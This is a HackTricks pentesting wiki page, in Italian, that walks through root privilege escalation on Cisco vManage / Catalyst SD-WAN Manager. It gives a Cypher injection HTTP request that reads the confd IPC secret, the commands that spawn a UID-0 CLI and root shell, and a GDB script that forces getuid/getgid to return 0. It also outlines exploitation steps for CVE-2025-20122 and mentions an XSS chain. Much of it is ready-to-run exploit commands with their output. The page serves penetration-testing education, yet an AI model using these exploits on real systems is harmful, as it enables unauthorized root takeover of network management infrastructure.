# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Percorso 1

(Esempio da [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Dopo aver esaminato un po' la [documentazione](http://66.218.245.39/doc/html/rn03re18.html) relativa a `confd` e ai diversi binari (accessibili con un account sul sito Cisco), abbiamo scoperto che per autenticare la socket IPC utilizza un segreto presente in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Ricordi la nostra istanza Neo4j? È in esecuzione con i privilegi dell'utente `vmanage`, permettendoci così di recuperare il file sfruttando la vulnerabilità precedente:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Il programma `confd_cli` non supporta argomenti da riga di comando ma invoca `/usr/bin/confd_cli_user` con argomenti. Quindi potremmo chiamare direttamente `/usr/bin/confd_cli_user` con il nostro insieme di argomenti. Tuttavia non è leggibile con i nostri privilegi attuali, quindi dobbiamo recuperarlo dal rootfs e copiarlo usando scp, leggere l'help e usarlo per ottenere la shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Percorso 2

(Esempio da [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Il blog¹ del team synacktiv ha descritto un modo elegante per ottenere una root shell, ma la limitazione è che richiede ottenere una copia di `/usr/bin/confd_cli_user` che è leggibile solo da root. Ho trovato un altro modo per ottenere i privilegi di root senza tale seccatura.

Quando ho disassemblato il binario `/usr/bin/confd_cli`, ho osservato quanto segue:

<details>
<summary>Objdump che mostra la raccolta di UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quando eseguo “ps aux”, ho osservato quanto segue (_nota -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ho ipotizzato che il programma “confd_cli” passi l'ID utente e l'ID gruppo raccolti dall'utente loggato all'applicazione “cmdptywrapper”.

Il mio primo tentativo è stato eseguire direttamente “cmdptywrapper” fornendogli `-g 0 -u 0`, ma è fallito. Sembra che un file descriptor (-i 1015) sia stato creato da qualche parte lungo il processo e non riesco a falsificarlo.

Come menzionato in synacktiv’s blog(last example), il programma `confd_cli` non supporta argomenti da linea di comando, ma posso influenzarlo con un debugger e fortunatamente GDB è incluso nel sistema.

Ho creato uno script GDB dove ho forzato le API `getuid` e `getgid` a ritornare 0. Dato che ho già il privilegio “vmanage” tramite la RCE di deserializzazione, ho il permesso di leggere direttamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Output della console:

<details>
<summary>Output della console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug)

Cisco ha rinominato vManage in *Catalyst SD-WAN Manager*, ma la CLI sottostante continua a girare sulla stessa macchina. Un advisory del 2025 (CVE-2025-20122) descrive una validazione insufficiente dell'input nella CLI che permette a **qualsiasi utente locale autenticato** di ottenere root inviando una richiesta appositamente costruita al servizio CLI del manager. Combina qualsiasi low-priv foothold (e.g., la Neo4j deserialization from Path1, or a cron/backup user shell) con questa falla per salire a root senza copiare `confd_cli_user` o collegare GDB:

1. Usa la tua shell low-priv per individuare l'endpoint IPC della CLI (tipicamente il listener `cmdptywrapper` mostrato sulla porta 4565 in Path2).
2. Costruisci una richiesta CLI che falsifichi i campi UID/GID a 0. Il bug di validazione non impone l'UID del chiamante originale, quindi il wrapper avvia un PTY con privilegi root.
3. Inoltra qualsiasi sequenza di comandi (`vshell; id`) attraverso la richiesta falsificata per ottenere una shell root.

> La superficie d'exploit è local-only; è ancora necessario remote code execution per ottenere la shell iniziale, ma una volta dentro la macchina lo sfruttamento è un singolo messaggio IPC invece di una debugger-based UID patch.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – Inietta JavaScript in campi specifici dell'interfaccia; il furto di una sessione admin ti offre un percorso browser-driven verso `vshell` → local shell → Path3 per ottenere root.

## Riferimenti

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
